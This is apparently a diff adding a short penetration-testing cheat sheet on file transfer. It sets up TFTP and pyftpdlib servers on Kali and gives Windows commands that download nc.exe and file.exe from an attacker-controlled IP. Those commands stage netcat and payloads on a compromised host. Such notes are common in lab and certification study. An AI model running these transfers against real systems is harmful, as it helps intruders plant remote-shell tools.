@@ -1,0 +1,22 @@
+TFTP
+
+atftpd --daemon --port 69 /tftp
+Windows> tftp -i 192.168.30.45 GET nc.exe
+
+*************************************************************************************************
+
+FTP (pyftpdlib client on Kali)
+# Ftp is  installed on Windows machines
+#  make it interactive, use -s option
+
+# On Kali install a ftp client and set a username/password
+apt-get install python-pyftpdlib  
+python -m pyftpdlib -p 21
+
+# on Windows
+ftp <attackerip>
+> binary
+> get file.exe
+
+**************************************************************************************************
+
